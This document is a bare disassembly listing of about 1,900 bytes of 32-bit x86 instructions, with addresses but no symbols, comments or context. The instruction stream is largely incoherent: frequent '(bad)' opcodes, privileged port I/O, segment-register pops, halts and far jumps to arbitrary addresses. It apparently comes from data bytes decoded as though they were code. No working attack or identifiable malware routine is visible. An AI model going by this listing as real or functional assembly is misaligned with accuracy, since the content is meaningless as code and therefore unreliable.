  41e71d:	add    dl,BYTE PTR ds:0xfcbf885a
  41e723:	lahf   
  41e724:	clc    
  41e725:	mov    ecx,0xbdb690db
  41e72a:	jle    0x41e77f
  41e72c:	cwde   
  41e72d:	cmp    ch,BYTE PTR [ebx+eax*2-0x6eb15c69]
  41e734:	cmp    ebx,DWORD PTR [edi]
  41e736:	dec    ecx
  41e737:	inc    edi
  41e738:	sbb    eax,0x7a821764
  41e73d:	ffreep st(6)
  41e73f:	push   ebx
  41e740:	ins    DWORD PTR es:[edi],dx
  41e741:	ret    
  41e742:	inc    esp
  41e743:	jno    0x41e781
  41e745:	inc    esp
  41e746:	jne    0x41e6cb
  41e748:	loop   0x41e794
  41e74a:	(bad)  
  41e74b:	(bad)  
  41e74c:	popf   
  41e74d:	push   ebp
  41e74e:	jbe    0x41e75d
  41e750:	mov    al,ds:0x9567268b
  41e755:	out    0x57,eax
  41e757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e758:	xchg   ecx,eax
  41e759:	or     ch,BYTE PTR [eax]
  41e75b:	mov    eax,ds:0x69d68b86
  41e760:	add    eax,0x212215d4
  41e765:	pop    edi
  41e766:	jns    0x41e793
  41e768:	mov    esp,ss
  41e76a:	out    0xe7,al
  41e76c:	pop    ss
  41e76d:	add    eax,0xfdf35b84
  41e772:	xor    al,dl
  41e774:	mov    ds:0xbad56b8d,al
  41e779:	mov    eax,0x71c54ada
  41e77e:	hlt    
  41e77f:	sbb    al,BYTE PTR [edi+0xf]
  41e782:	shl    al,1
  41e784:	dec    edx
  41e785:	add    cl,bh
  41e787:	lods   eax,DWORD PTR ds:[esi]
  41e788:	outs   dx,DWORD PTR ds:[esi]
  41e789:	cmc    
  41e78a:	xor    DWORD PTR [edx-0x7fe12c3d],eax
  41e790:	jmp    0x41e78b
  41e792:	popf   
  41e793:	push   ss
  41e794:	fisttp WORD PTR [edx]
  41e796:	push   cs
  41e797:	xchg   esp,eax
  41e798:	xor    edi,edi
  41e79a:	add    BYTE PTR [esi+edx*2+0x76ca4f0e],bl
  41e7a1:	jmp    0x57c23650
  41e7a6:	scas   al,BYTE PTR es:[edi]
  41e7a7:	fidiv  DWORD PTR [edi+0x4cfe32ca]
  41e7ad:	stos   BYTE PTR es:[edi],al
  41e7ae:	xchg   ebp,eax
  41e7af:	mov    edi,0xc32bf384
  41e7b4:	pop    eax
  41e7b5:	add    DWORD PTR [ebx],esp
  41e7b7:	add    DWORD PTR ds:0x2fd1e4b3,eax
  41e7bd:	dec    bl
  41e7bf:	cwde   
  41e7c0:	stos   DWORD PTR es:[edi],eax
  41e7c1:	stos   BYTE PTR es:[edi],al
  41e7c2:	les    ecx,FWORD PTR [ebx+0x24158161]
  41e7c8:	jecxz  0x41e824
  41e7ca:	push   eax
  41e7cb:	mov    al,ds:0xdbc048c8
  41e7d0:	mov    esp,0x63471ca0
  41e7d5:	xlat   BYTE PTR ds:[ebx]
  41e7d6:	ss lahf 
  41e7d8:	into   
  41e7d9:	jecxz  0x41e843
  41e7db:	pop    ds
  41e7dc:	ins    BYTE PTR es:[edi],dx
  41e7dd:	pusha  
  41e7de:	and    al,0x84
  41e7e0:	repnz out dx,al
  41e7e2:	test   eax,ebx
  41e7e4:	and    DWORD PTR [edx-0x3e994bd2],edx
  41e7ea:	xor    al,0x85
  41e7ec:	js     0x41e797
  41e7ee:	(bad)  
  41e7ef:	pop    ecx
  41e7f0:	adc    bl,dl
  41e7f2:	rcr    BYTE PTR [ecx-0x8328ad4],cl
  41e7f8:	fisttp DWORD PTR [eax-0xffc2cc8]
  41e7fe:	ins    BYTE PTR es:[edi],dx
  41e7ff:	xchg   edi,eax
  41e800:	cwde   
  41e801:	push   esp
  41e802:	ffree  st(0)
  41e804:	int3   
  41e805:	sbb    DWORD PTR [edi-0x4183b424],0xff98198e
  41e80f:	sbb    eax,0x7d7bebf2
  41e814:	inc    ebx
  41e815:	sub    cl,BYTE PTR [ecx-0xb44bece]
  41e81b:	cmp    bh,BYTE PTR [ebx-0x16]
  41e81e:	pop    es
  41e81f:	push   es
  41e820:	or     ebx,esi
  41e822:	test   DWORD PTR [eax-0x8],0xff0c8b0
  41e829:	inc    esi
  41e82a:	aaa    
  41e82b:	add    BYTE PTR [edx-0xec4a553],dh
  41e831:	ds xor cl,dh
  41e834:	dec    ecx
  41e835:	jp     0x41e8a1
  41e837:	mov    esp,0xbb5db533
  41e83c:	(bad)  
  41e83d:	xor    edx,DWORD PTR [ebx+0x20]
  41e840:	lahf   
  41e841:	and    BYTE PTR [bp+0xc],bl
  41e845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e846:	fwait
  41e847:	pushf  
  41e848:	aad    0x39
  41e84a:	sbb    DWORD PTR [ecx-0x268497f3],edi
  41e850:	mov    BYTE PTR [ebp+0x15],bl
  41e853:	add    bh,BYTE PTR [edi-0x5d066e3e]
  41e859:	jg     0x41e81d
  41e85b:	scas   eax,DWORD PTR es:[edi]
  41e85c:	shl    BYTE PTR [ecx+0x50361cbd],0xbd
  41e863:	or     ebp,eax
  41e865:	mov    ecx,DWORD PTR [eax+0x78]
  41e868:	sti    
  41e869:	cmp    eax,edx
  41e86b:	(bad)
  41e86f:	xor    al,0x35
  41e871:	popa   
  41e872:	repnz push eax
  41e874:	hlt    
  41e875:	pusha  
  41e876:	jo     0x41e8da
  41e878:	adc    ebx,0x5b20df5f
  41e87e:	push   edi
  41e87f:	sbb    ch,ch
  41e881:	jns    0x41e865
  41e883:	adc    BYTE PTR [eax+0x6b],dl
  41e886:	dec    ebp
  41e887:	fcom   DWORD PTR [esp+edx*1+0x35]
  41e88b:	cmp    esi,DWORD PTR [ebp+0x2d]
  41e88e:	inc    eax
  41e88f:	popf   
  41e890:	dec    ebx
  41e891:	addr16 call edx
  41e894:	pop    es
  41e895:	loop   0x41e8a6
  41e897:	arpl   sp,cx
  41e899:	push   eax
  41e89a:	sbb    BYTE PTR [edx-0x2c],dh
  41e89d:	in     al,dx
  41e89e:	cmp    esi,DWORD PTR [edi]
  41e8a0:	scas   eax,DWORD PTR es:[edi]
  41e8a1:	mov    ch,0x9e
  41e8a3:	inc    edx
  41e8a4:	cli    
  41e8a5:	mov    edx,0xabd5fad5
  41e8aa:	rcl    BYTE PTR [eax-0x5e75d7de],cl
  41e8b0:	sub    eax,0x8f713000
  41e8b5:	mov    ds:0xedcc4f20,al
  41e8ba:	lods   al,BYTE PTR ds:[esi]
  41e8bb:	inc    bp
  41e8bd:	cmp    eax,0xeb46b3ea
  41e8c2:	sbb    eax,0xfa445b12
  41e8c7:	sbb    ebx,DWORD PTR [edx+0x78]
  41e8ca:	jns    0x41e86d
  41e8cc:	test   al,0xb2
  41e8ce:	jl     0x41e94b
  41e8d0:	sbb    al,0x51
  41e8d2:	enter  0xa7eb,0xd8
  41e8d6:	mov    ds:0xc8cb3369,al
  41e8db:	arpl   cx,sp
  41e8dd:	dec    edi
  41e8de:	mov    ch,0xa8
  41e8e0:	les    eax,FWORD PTR [esi+0x74]
  41e8e3:	adc    BYTE PTR [edi+0x4],dh
  41e8e6:	pushf  
  41e8e7:	cdq    
  41e8e8:	imul   ecx,ebp,0xb82a3825
  41e8ee:	rcr    BYTE PTR [edx],0x80
  41e8f1:	rol    DWORD PTR [edx+0x6c2e20a2],cl
  41e8f7:	popf   
  41e8f8:	mov    bh,0x13
  41e8fa:	mov    ecx,0x840a5165
  41e8ff:	adc    al,0xb9
  41e901:	loopne 0x41e924
  41e903:	ret    0x1f0d
  41e906:	mov    bh,0xa5
  41e908:	sbb    edi,DWORD PTR [eax]
  41e90a:	fdiv   QWORD PTR [ecx]
  41e90c:	call   0xb61ff4c8
  41e911:	xchg   esi,eax
  41e912:	inc    esi
  41e913:	cmp    al,0x9f
  41e915:	ds cli 
  41e917:	adc    al,0xab
  41e919:	push   esi
  41e91a:	outs   dx,BYTE PTR ss:[esi]
  41e91c:	addr16 jns 0x41e992
  41e91f:	(bad)  
  41e922:	or     ah,dh
  41e924:	pushf  
  41e925:	xchg   esi,eax
  41e926:	retf   0x43b0
  41e929:	pop    ebx
  41e92a:	lds    ecx,FWORD PTR [edi+0x55d08be6]
  41e930:	icebp  
  41e931:	sub    BYTE PTR [eax+0x1cf7490b],0xa2
  41e938:	out    0x62,eax
  41e93a:	mov    dl,0x27
  41e93c:	cdq    
  41e93d:	lods   al,BYTE PTR ds:[esi]
  41e93e:	js     0x41e976
  41e940:	out    dx,eax
  41e941:	sti    
  41e942:	popf   
  41e943:	sub    dh,bh
  41e945:	mov    al,BYTE PTR [ebp+0x21]
  41e948:	push   eax
  41e949:	push   ebx
  41e94a:	pushf  
  41e94b:	nop
  41e94c:	mov    al,BYTE PTR [eax+0x78]
  41e94f:	aam    0xb0
  41e951:	add    al,0x6a
  41e953:	jnp    0x41e988
  41e955:	ins    DWORD PTR es:[edi],dx
  41e956:	fimul  DWORD PTR [edi-0x33a838e]
  41e95c:	jo     0x41e98e
  41e95e:	ffree  st(4)
  41e960:	mov    ebp,0x7e270c5c
  41e965:	cmc    
  41e966:	dec    eax
  41e967:	inc    ebx
  41e968:	arpl   WORD PTR [edi],ax
  41e96a:	mov    esp,0x677b6f2e
  41e96f:	jnp    0x41e9bb
  41e971:	pop    edi
  41e972:	icebp  
  41e973:	mul    DWORD PTR [eax+ebp*2]
  41e976:	ror    edx,1
  41e978:	pop    ss
  41e979:	pop    edi
  41e97a:	out    0xda,al
  41e97c:	je     0x41e9f3
  41e97e:	jp     0x41e990
  41e980:	adc    al,0x15
  41e982:	and    bl,ch
  41e984:	inc    edi
  41e985:	add    ah,BYTE PTR [eax-0x11]
  41e988:	sub    bl,BYTE PTR [ebx]
  41e98a:	add    al,0x5d
  41e98c:	sbb    eax,0xadcb8f08
  41e991:	add    ebp,DWORD PTR ss:[edx+ebp*1-0x1bae15d]
  41e999:	repz mov ah,0x5e
  41e99c:	fnstsw WORD PTR [ecx]
  41e99e:	xor    al,BYTE PTR [ebp+0x15]
  41e9a1:	push   ebx
  41e9a2:	mov    cl,0xb6
  41e9a4:	and    DWORD PTR [ecx-0x79e5d256],ebx
  41e9aa:	imul   eax,DWORD PTR [ebp-0x77],0xffffffff
  41e9ae:	xchg   BYTE PTR [edx+ebp*2],dh
  41e9b1:	dec    ebx
  41e9b2:	es jo  0x41e9be
  41e9b5:	jle    0x41e9d9
  41e9b7:	out    0x58,eax
  41e9b9:	rcr    BYTE PTR [ecx+ebp*4],cl
  41e9bc:	xchg   edx,eax
  41e9bd:	push   0xffffffcd
  41e9bf:	arpl   si,cx
  41e9c1:	push   edx
  41e9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c3:	aad    0xa7
  41e9c5:	and    DWORD PTR [ecx],edi
  41e9c7:	xchg   esp,eax
  41e9c8:	push   ss
  41e9c9:	retf   
  41e9ca:	out    dx,al
  41e9cb:	and    DWORD PTR [eax+edi*1+0x62],0xcbb9f5ed
  41e9d3:	stos   BYTE PTR es:[edi],al
  41e9d4:	int    0x12
  41e9d6:	pop    ds
  41e9d7:	pop    esi
  41e9d8:	test   al,0x46
  41e9da:	idiv   eax
  41e9dc:	aam    0x90
  41e9de:	mov    edx,0xe19a5b82
  41e9e3:	lea    esi,[edx+0x538d432a]
  41e9e9:	jo     0x41ea3d
  41e9eb:	push   edx
  41e9ec:	mov    esp,0x771e4362
  41e9f1:	pop    ds
  41e9f2:	leave  
  41e9f3:	add    DWORD PTR [ecx-0x4eab43e4],ebp
  41e9f9:	cmp    bh,BYTE PTR [ecx-0x1c19b8bf]
  41e9ff:	enterw 0xdbd4,0xa6
  41ea04:	adc    cl,BYTE PTR [ebp-0x63]
  41ea07:	sub    eax,0x8a016078
  41ea0c:	add    eax,0xf6e9306d
  41ea11:	test   edx,ecx
  41ea13:	pop    ds
  41ea14:	mov    esi,0x235beb75
  41ea19:	je     0x41ea83
  41ea1b:	pop    ebx
  41ea1c:	stos   DWORD PTR es:[edi],eax
  41ea1d:	sub    ch,cl
  41ea1f:	(bad)  
  41ea20:	out    0x19,al
  41ea22:	mov    ebx,esp
  41ea24:	mov    dl,0x8e
  41ea26:	inc    ebx
  41ea27:	push   ecx
  41ea28:	dec    esp
  41ea29:	cmp    al,0xf6
  41ea2b:	(bad)  
  41ea2c:	not    BYTE PTR [edx+edi*4]
  41ea2f:	je     0x41ea79
  41ea31:	fisttp QWORD PTR ds:0x132d80cd
  41ea37:	add    dl,BYTE PTR [ecx+0x4d]
  41ea3a:	iret   
  41ea3b:	(bad)  
  41ea3c:	mov    ch,0x1f
  41ea3e:	(bad)  
  41ea3f:	or     BYTE PTR [edx+0x0],cl
  41ea42:	mov    ah,0x55
  41ea44:	push   esi
  41ea45:	mov    ecx,0x8a377591
  41ea4a:	ins    DWORD PTR es:[edi],dx
  41ea4b:	add    eax,0xb0fbf962
  41ea50:	std    
  41ea51:	stc    
  41ea52:	and    DWORD PTR [edi+eax*8-0x4077f747],ecx
  41ea59:	cs arpl dx,bp
  41ea5c:	push   edx
  41ea5d:	lahf   
  41ea5e:	jl     0x41ea27
  41ea60:	pop    ds
  41ea61:	mov    eax,ds
  41ea63:	cdq    
  41ea64:	stos   DWORD PTR es:[edi],eax
  41ea65:	(bad)  
  41ea66:	fdiv   QWORD PTR [eax]
  41ea68:	sub    BYTE PTR [ebp+0x71e7bca7],dh
  41ea6e:	mov    bh,0x1f
  41ea70:	inc    ebp
  41ea71:	dec    ebx
  41ea72:	aam    0x7e
  41ea74:	cli    
  41ea75:	inc    edi
  41ea76:	jge    0x41ea29
  41ea78:	or     edi,DWORD PTR [eax+ecx*4+0x69]
  41ea7c:	addr16 jmp 0xe406d4b
  41ea82:	inc    eax
  41ea83:	cmp    eax,0xad99280f
  41ea88:	jle    0x41eb05
  41ea8a:	cmp    al,0x65
  41ea8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea8d:	je     0x41ea15
  41ea8f:	add    al,0x83
  41ea91:	int3   
  41ea92:	stc    
  41ea93:	add    BYTE PTR [edi+0x164435b1],cl
  41ea99:	addr16 jo 0x41eab1
  41ea9c:	inc    ebx
  41ea9d:	pop    edi
  41ea9e:	ror    BYTE PTR [edx],1
  41eaa0:	add    al,0x95
  41eaa2:	lods   al,BYTE PTR ds:[esi]
  41eaa3:	adc    ebp,ebx
  41eaa5:	call   FWORD PTR [esi+0x6d351659]
  41eaab:	(bad)  
  41eaac:	xor    eax,0x709e49bc
  41eab1:	jmp    0x67bed5af
  41eab6:	loop   0x41ea49
  41eab8:	adc    ah,BYTE PTR [edi]
  41eaba:	pop    ebp
  41eabb:	ret    0xa792
  41eabe:	leave  
  41eabf:	mov    ah,0x5d
  41eac1:	clc    
  41eac2:	imul   DWORD PTR [ebx+0x6]
  41eac5:	mov    bl,0x4
  41eac7:	mov    ah,0x65
  41eac9:	retf   
  41eaca:	pushf  
  41eacb:	jge    0x41ead1
  41eacd:	aas    
  41eace:	clc    
  41eacf:	aas    
  41ead0:	lahf   
  41ead1:	xchg   DWORD PTR [edx],esp
  41ead3:	mov    bh,0xa2
  41ead5:	push   cs
  41ead6:	mov    ebx,0x342d77e9
  41eadb:	push   0x462fddaf
  41eae0:	mov    WORD PTR [esi-0x79ce61ab],?
  41eae6:	leave  
  41eae7:	fs jmp 0x41eae7
  41eaea:	push   esp
  41eaeb:	sub    cl,0x36
  41eaee:	dec    ecx
  41eaef:	lods   eax,DWORD PTR ds:[esi]
  41eaf0:	add    eax,0x494211f8
  41eaf5:	xchg   ebp,eax
  41eaf6:	les    ecx,FWORD PTR [esp+edi*1-0x738c3df8]
  41eafd:	jp     0x41eb5d
  41eaff:	dec    edi
  41eb00:	(bad)  
  41eb01:	and    BYTE PTR [ebp+0x4],dh
  41eb04:	mov    BYTE PTR [edx],dl
  41eb06:	mov    ch,0xab
  41eb08:	shl    DWORD PTR [esi],0xb1
  41eb0b:	dec    edx
  41eb0c:	ins    BYTE PTR es:[edi],dx
  41eb0d:	xor    esp,DWORD PTR [ecx+0x50]
  41eb10:	daa    
  41eb11:	xchg   edi,eax
  41eb12:	mov    WORD PTR [ebp+0x2d5cbcd2],cs
  41eb18:	and    ebx,DWORD PTR [esi+0x14]
  41eb1b:	xor    al,0x46
  41eb1d:	add    dh,cl
  41eb1f:	addps  xmm2,XMMWORD PTR [edx-0x47]
  41eb23:	cmp    eax,0x1fa9a516
  41eb28:	push   edx
  41eb29:	sahf   
  41eb2a:	cli    
  41eb2b:	ins    BYTE PTR es:[edi],dx
  41eb2c:	into   
  41eb2d:	cdq    
  41eb2e:	icebp  
  41eb2f:	inc    esp
  41eb30:	push   ecx
  41eb31:	dec    eax
  41eb32:	jo     0x41eb86
  41eb34:	ret    
  41eb35:	mov    dh,0x98
  41eb37:	xchg   edi,eax
  41eb38:	test   eax,0x6546222b
  41eb3d:	test   al,0x39
  41eb3f:	inc    esp
  41eb40:	mov    ebx,edx
  41eb42:	ins    DWORD PTR es:[edi],dx
  41eb43:	addr16 mov edx,0x5d3ef857
  41eb49:	mov    esi,0x27564d6
  41eb4e:	push   edx
  41eb4f:	jmp    0x4bae050c
  41eb54:	cld    
  41eb55:	out    dx,al
  41eb56:	fdiv   QWORD PTR [ebx-0x5f6ef949]
  41eb5c:	push   ds
  41eb5d:	mov    WORD PTR [ecx-0x48],es
  41eb60:	in     eax,0xc7
  41eb62:	mov    edx,0x39db9531
  41eb67:	push   edx
  41eb68:	push   0xf99700a5
  41eb6d:	inc    esp
  41eb6e:	inc    edi
  41eb6f:	adc    DWORD PTR [eax-0x10],esp
  41eb72:	mov    ah,0x35
  41eb74:	mov    ds:0xb3396095,al
  41eb79:	add    eax,DWORD PTR [eax+ecx*2-0x2a1ba6bc]
  41eb80:	es out 0xe3,al
  41eb83:	loop   0x41eb1a
  41eb85:	jp     0x41ebb5
  41eb87:	shl    BYTE PTR [esi],cl
  41eb89:	pop    ds
  41eb8a:	pop    esp
  41eb8b:	sar    BYTE PTR [ecx+0x12f15dc7],cl
  41eb91:	daa    
  41eb92:	inc    edi
  41eb93:	mov    edx,0xedacf7a7
  41eb98:	xor    al,0xe7
  41eb9b:	jb     0x41ebcc
  41eb9d:	ins    DWORD PTR es:[edi],dx
  41eb9e:	scas   eax,DWORD PTR es:[edi]
  41eb9f:	mov    ch,0x24
  41eba1:	mov    WORD PTR [esi],cs
  41eba3:	lea    esp,[edi+0x5f]
  41eba6:	mov    dh,0x3b
  41eba8:	pop    ebp
  41eba9:	test   BYTE PTR [esi],al
  41ebab:	add    eax,0xebb39f3
  41ebb0:	and    ecx,DWORD PTR [ebp-0x40bd0b57]
  41ebb6:	push   ecx
  41ebb7:	xor    ah,BYTE PTR [edx]
  41ebb9:	push   cs
  41ebba:	sbb    BYTE PTR [eax],ch
  41ebbc:	fwait
  41ebbd:	adc    edi,ebx
  41ebbf:	push   0x3a4d9bb0
  41ebc4:	sbb    eax,0x7d6bacce
  41ebc9:	repnz jecxz 0x41ebc0
  41ebcc:	das    
  41ebcd:	inc    ebx
  41ebce:	and    dl,dl
  41ebd0:	in     al,dx
  41ebd1:	in     al,0x4b
  41ebd3:	add    eax,0x6d32f04b
  41ebd8:	jle    0x41eb6b
  41ebda:	mov    ah,0xff
  41ebdc:	xchg   edi,eax
  41ebdd:	and    BYTE PTR [ecx+0x7c56b594],bl
  41ebe3:	shl    DWORD PTR [ebx+0x2d],cl
  41ebe6:	es jmp 0x41ec1a
  41ebe9:	xor    cl,BYTE PTR [edi+0x46]
  41ebec:	loop   0x41ec2d
  41ebee:	sahf   
  41ebef:	ds mov esi,0x40a3cfb0
  41ebf5:	out    dx,eax
  41ebf6:	iret   
  41ebf7:	mov    ds:0x8c8005b4,eax
  41ebfc:	sbb    eax,0x95117a0d
  41ec01:	add    eax,0xa37e07f3
  41ec06:	vmwrite ecx,DWORD PTR [edi+0x12]
  41ec0a:	imul   esp,DWORD PTR [edx+0x72b588fb],0x6b
  41ec11:	mov    ds:0xe7a50868,eax
  41ec16:	inc    eax
  41ec17:	loope  0x41ec79
  41ec19:	aam    0xb2
  41ec1b:	jb     0x41ec4b
  41ec1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec1e:	je     0x41ec35
  41ec20:	push   0xffffff97
  41ec22:	mov    dl,0x75
  41ec24:	mov    DWORD PTR fs:0x4ebbe2e4,ebx
  41ec2b:	daa    
  41ec2c:	ficom  WORD PTR [ebx]
  41ec2e:	inc    eax
  41ec2f:	dec    edx
  41ec30:	pop    ds
  41ec31:	mov    bl,0xd8
  41ec33:	push   ds
  41ec34:	ins    BYTE PTR es:[edi],dx
  41ec35:	adc    BYTE PTR [ebx],bh
  41ec37:	inc    ebp
  41ec38:	scas   al,BYTE PTR es:[edi]
  41ec39:	push   es
  41ec3a:	ficom  DWORD PTR [ecx+0x4f]
  41ec3d:	test   eax,0xed18c590
  41ec42:	inc    ecx
  41ec43:	loope  0x41ec0c
  41ec45:	in     eax,dx
  41ec46:	out    0xf9,eax
  41ec48:	mov    ch,0x65
  41ec4a:	(bad)  
  41ec4b:	jae    0x41ec2e
  41ec4d:	shl    DWORD PTR [ebp-0x7453917f],cl
  41ec53:	into   
  41ec54:	cmp    al,0x8d
  41ec56:	pushf  
  41ec57:	imul   edx,DWORD PTR [edi+0x5eccfe4],0x39e04c9a
  41ec61:	loop   0x41ec0b
  41ec63:	inc    ebp
  41ec64:	test   BYTE PTR [edi-0x1492794d],cl
  41ec6a:	in     eax,0x28
  41ec6c:	push   edx
  41ec6d:	mov    ebx,DWORD PTR [ebx+0x39]
  41ec70:	jp     0x41ec11
  41ec72:	cmp    al,0xcb
  41ec74:	ror    DWORD PTR [esi+edx*4],cl
  41ec77:	les    edi,FWORD PTR [edx+edi*8]
  41ec7a:	xchg   esi,eax
  41ec7b:	xor    DWORD PTR [ebx-0x3c],edi
  41ec7e:	mov    esp,0x67bf83b7
  41ec83:	jae    0x41ec25
  41ec85:	lea    edx,[ecx]
  41ec87:	xchg   edi,eax
  41ec88:	mov    eax,ds:0xd0545472
  41ec8d:	or     al,0xb1
  41ec8f:	cdq    
  41ec90:	or     eax,0x206a5979
  41ec95:	lea    edi,[ebx]
  41ec97:	sub    eax,0xd547031d
  41ec9c:	xor    edi,DWORD PTR [ebx-0x7c]
  41ec9f:	jbe    0x41ecfd
  41eca1:	les    edx,FWORD PTR [edx]
  41eca3:	clc    
  41eca4:	inc    BYTE PTR ds:0xa725f1cb
  41ecaa:	mov    esp,0xf273c614
  41ecaf:	or     BYTE PTR [edi-0x59],0xfd
  41ecb3:	push   es
  41ecb4:	rcr    edx,1
  41ecb6:	(bad)  
  41ecb8:	rcr    ecx,0x4b
  41ecbb:	test   DWORD PTR [edi-0x80],eax
  41ecbe:	mov    al,0xdb
  41ecc0:	in     eax,0xa7
  41ecc2:	sbb    al,0x30
  41ecc4:	xchg   esi,eax
  41ecc5:	mov    edx,0x8185709f
  41ecca:	mov    edi,0x1c615c7d
  41eccf:	fsin   
  41ecd1:	adc    DWORD PTR [edx+0x1d],eax
  41ecd4:	imul   edi,DWORD PTR [eax],0xac3e4604
  41ecda:	jl     0x41ed49
  41ecdc:	mov    edi,0xd8f1ad07
  41ece1:	mov    WORD PTR [edi+0x6ac53f2f],fs
  41ece7:	jmp    0x6e5e73b1
  41ecec:	lods   eax,DWORD PTR ds:[esi]
  41eced:	mov    BYTE PTR [edi+eax*4],dl
  41ecf0:	pop    ebp
  41ecf1:	jae    0x41ecca
  41ecf3:	jg     0x41ecd8
  41ecf5:	ret    0x98a6
  41ecf8:	neg    BYTE PTR [eax]
  41ecfa:	mov    WORD PTR [edx+esi*2-0x60],fs
  41ecfe:	call   0x56c3ff30
  41ed03:	push   esp
  41ed04:	mov    esp,0xca53945b
  41ed09:	inc    esi
  41ed0a:	pop    ss
  41ed0b:	lahf   
  41ed0c:	and    bl,BYTE PTR [ebx-0x25]
  41ed0f:	je     0x41ed4b
  41ed11:	mov    dh,0x8c
  41ed13:	in     eax,dx
  41ed14:	mov    ds:0xa199c209,eax
  41ed19:	or     ebp,DWORD PTR [ecx+0x5228ddc3]
  41ed1f:	add    eax,0x2d436374
  41ed24:	mov    edx,0x8303557c
  41ed29:	fmul   st,st(0)
  41ed2b:	pusha  
  41ed2c:	pop    es
  41ed2d:	call   0x4673b095
  41ed32:	xchg   bh,dh
  41ed34:	adc    ch,BYTE PTR [edx]
  41ed36:	dec    esi
  41ed37:	mov    al,ds:0x8b7cc8cc
  41ed3c:	mov    dh,0x8
  41ed3e:	add    al,0xe9
  41ed40:	cmc    
  41ed41:	push   edx
  41ed42:	lahf   
  41ed43:	and    BYTE PTR [ebp+0x7f7974a0],dl
  41ed49:	js     0x41ed61
  41ed4b:	(bad)  
  41ed4d:	pop    eax
  41ed4e:	xchg   DWORD PTR [esi],ecx
  41ed50:	call   0xe0aa:0x3953f6
  41ed57:	fld    TBYTE PTR [ebp+0xa]
  41ed5a:	push   0xe
  41ed5c:	inc    ebp
  41ed5d:	aam    0xbd
  41ed5f:	sub    DWORD PTR [ebp-0x1],ecx
  41ed62:	xor    edi,DWORD PTR [esi-0xf4302dc]
  41ed68:	inc    esi
  41ed69:	loop   0x41ed52
  41ed6b:	push   edi
  41ed6c:	adc    ch,BYTE PTR [ebp+ebp*2-0x5b48b9ed]
  41ed73:	sbb    eax,eax
  41ed75:	and    BYTE PTR [eax-0x1],0xf3
  41ed79:	rol    DWORD PTR [eax-0x40],cl
  41ed7c:	cmp    BYTE PTR [edi],al
  41ed7e:	push   esi
  41ed7f:	(bad)  
  41ed80:	cmp    DWORD PTR [ebx+0x3b],edx
  41ed83:	sub    esi,DWORD PTR [edx+0x775f5f3f]
  41ed89:	fadd   DWORD PTR [ebx-0x51e39be9]
  41ed8f:	(bad)  
  41ed90:	dec    edi
  41ed91:	shl    BYTE PTR [esi],0x86
  41ed94:	push   0xd0d9ff45
  41ed99:	into   
  41ed9a:	retf   
  41ed9b:	test   DWORD PTR [edi+0x4cdcfa0c],ebx
  41eda1:	es add edi,ebp
  41eda4:	cmp    ah,ch
  41eda6:	fist   WORD PTR [eax]
  41eda8:	lahf   
  41eda9:	or     DWORD PTR [esi],edi
  41edab:	mov    al,0xda
  41edad:	dec    ebp
  41edae:	test   al,0x8f
  41edb0:	aaa    
  41edb1:	shr    DWORD PTR [esp+ebp*2-0x444abbf1],1
  41edb8:	jne    0x41ed66
  41edba:	jecxz  0x41eda7
  41edbc:	or     BYTE PTR [eax+0x6d],al
  41edbf:	scas   al,BYTE PTR es:[edi]
  41edc0:	jge    0x41eddc
  41edc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edc3:	pop    eax
  41edc4:	dec    edx
  41edc5:	xor    eax,0x17d3aba4
  41edca:	ret    
  41edcb:	pop    ebp
  41edcc:	shl    BYTE PTR [edx+0x341c4542],0x24
  41edd3:	pshufw mm1,QWORD PTR [esi-0x66d6740b],0xec
  41eddb:	(bad)  
  41eddc:	jge    0x41ee28
  41edde:	cdq    
  41eddf:	pop    ss
  41ede0:	dec    ecx
  41ede1:	cmp    ebx,esi
  41ede3:	cwde   
  41ede4:	in     al,0xa4
  41ede6:	std    
  41ede7:	or     BYTE PTR [ebx-0x18],al
  41edea:	inc    esi
  41edeb:	inc    eax
  41edec:	inc    esp
  41eded:	popa   
  41edee:	test   eax,0xc2cccfe6
  41edf3:	sbb    al,0x2d
  41edf5:	sub    DWORD PTR [edx],0x61efab57
  41edfb:	xchg   BYTE PTR [ebx-0x73],cl
  41edfe:	(bad)  [ebx+0x3f2b215d]
  41ee04:	sbb    al,0x3c
  41ee06:	mov    dl,0x8b
  41ee08:	sub    BYTE PTR [ebp-0x786f43c7],al
  41ee0e:	div    BYTE PTR [eax-0x6b8b4427]
  41ee14:	inc    ebx
  41ee16:	or     ah,BYTE PTR [esi+0xf]
  41ee19:	mov    ecx,0xb0af189a
  41ee1e:	inc    esi
  41ee1f:	mov    ebx,0xa2ac92e4
  41ee24:	(bad)  
  41ee25:	popa   
  41ee26:	loope  0x41eddd
  41ee28:	jge    0x41ee18
  41ee2a:	and    DWORD PTR [ebp-0x795f24cd],ebp
  41ee30:	fst    st(5)
  41ee32:	shl    BYTE PTR [edx+ebx*8+0x277864f0],cl
  41ee39:	add    ecx,DWORD PTR [ebx+0x61d0695d]
  41ee3f:	xchg   ebp,eax
  41ee40:	mov    ch,0x9f
  41ee42:	xchg   ebx,eax
  41ee43:	(bad)  
  41ee44:	mov    WORD PTR [ebx+0x1f],ss
  41ee47:	add    edi,DWORD PTR [edi]
  41ee49:	sub    BYTE PTR [ebx+0x3f],cl
  41ee4c:	repz sbb al,0x11
  41ee4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee50:	clc    
  41ee51:	mov    edx,DWORD PTR [ecx]
  41ee53:	(bad)  
  41ee54:	sbb    ah,BYTE PTR [ecx+0x220a86e0]
  41ee5a:	cmp    DWORD PTR [eax-0x4c],edx
  41ee5d:	fist   DWORD PTR [edx+0x236c1dec]
  41ee63:	sub    ecx,DWORD PTR [edx]
  41ee65:	fstp   TBYTE PTR [edx+0x49]
  41ee68:	out    dx,al
  41ee69:	into   
  41ee6a:	in     eax,dx
  41ee6b:	mov    bh,0xf6
  41ee6d:	mov    bl,0x83
  41ee6f:	mov    ds:0xfcf56704,al
  41ee74:	mov    edx,0x99554498
  41ee79:	fs ror edx,cl
  41ee7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee7d:	(bad)  
  41ee7e:	outs   dx,DWORD PTR ds:[esi]
  41ee7f:	pushf  
  41ee80:	rol    BYTE PTR [esi-0x3c],1
  41ee83:	and    al,0xe8
